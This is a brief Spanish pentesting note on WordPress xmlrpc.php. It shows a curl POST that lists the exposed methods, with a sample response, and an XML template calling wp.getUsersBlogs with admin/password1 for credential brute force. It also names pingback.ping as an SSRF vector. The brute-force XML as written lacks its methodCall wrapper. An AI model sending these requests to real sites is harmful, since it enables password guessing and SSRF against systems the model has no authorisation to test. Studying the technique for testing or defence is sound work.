Si descubrimos que una pagina [[WordPress]] tiene habilitado el directorio _xmlrpc.php_, podemos tramitar una solicitud por POST adjuntando el siguiente archivo _XML_ con el fin de saber si es vulnerable a un posible ataque de _fuerza bruta_. 

Esta es la sintaxis de la peticion:

```bash
curl -s -X POST https://example.com/xmlrpc.php -d @file.xml
```

Y este es el contenido que deberia tener el _file.xml_:

```xml
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

Deberia devolver algo tal que asi:

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <methodResponse>
    <params>
    <param>
      <value>
    <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  ...
  <value><string>wp.getUsersBlogs</string></value>
  </data></array>
      </value>
    </param>
  </params>
  </methodResponse>
```

Ahi esta devolviendo los metodos disponibles. 

_wp.getUsersBlogs_ --> Permite al atacante posibles ataques de Fuerza Bruta a credenciales con la siguiente peticion _XML_:

```xml
<?xml version="1.0" encoding="utf-8"?>
<methodName>wp.getUsersBlogs</methodName>
<params>
  <param><string>admin</string></param>
  <param><string>password1</string></param>
</params>
```


_pingback.ping_ --> Posibles ataques [[SSRF]], 
 








